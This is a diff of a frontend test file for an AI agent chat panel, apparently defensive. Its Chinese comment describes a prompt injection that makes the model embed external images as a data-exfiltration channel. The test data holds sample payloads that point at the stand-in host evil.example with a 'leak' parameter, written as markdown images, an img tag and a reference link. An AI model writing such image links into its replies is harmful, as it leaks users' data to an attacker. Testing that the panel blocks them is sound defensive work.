@@ -349,12 +349,6 @@ describe('AgentPanel in a conversation', () => {
   })
 })
 
-/**
- * 注入要模型在回覆裡塞外部圖片（M5 票 15 第 5 類）：圖片網址是常見的外洩通道（brief §14）。後端把模型
- * 寫的字原樣交成 `text` 片段（`tests/integration/test_agent_injection.py::TestImagesInTheReply`）；
- * 這裡證明整個面板——重新載入的回覆、工具結果、壓縮摘要、剛串流進來的回覆——都不載入它。
- * 單一元件怎麼畫在 `Markdown.test.tsx`（票 12）。
- */
 describe('AgentPanel draws the reasoning folded (M5.5 ticket 16)', () => {
   const THOUGHT = '使用者想知道下載為什麼還沒完成。\n最後一行：直接回答。'
 
@@ -411,6 +405,12 @@ describe('AgentPanel draws the reasoning folded (M5.5 ticket 16)', () => {
   })
 })
 
+/**
+ * 注入要模型在回覆裡塞外部圖片（M5 票 15 第 5 類）：圖片網址是常見的外洩通道（brief §14）。後端把模型
+ * 寫的字原樣交成 `text` 片段（`tests/integration/test_agent_injection.py::TestImagesInTheReply`）；
+ * 這裡證明整個面板——重新載入的回覆、工具結果、壓縮摘要、剛串流進來的回覆——都不載入它。
+ * 單一元件怎麼畫在 `Markdown.test.tsx`（票 12）。
+ */
 describe('AgentPanel with a reply an injection wrote', () => {
   const PIXEL = 'https://evil.example/pixel.png?k=leak'
   const INJECTED = `好的。![ok](${PIXEL})\n\n<img src="${PIXEL}">\n\n![參照][p]\n\n[p]: ${PIXEL}`
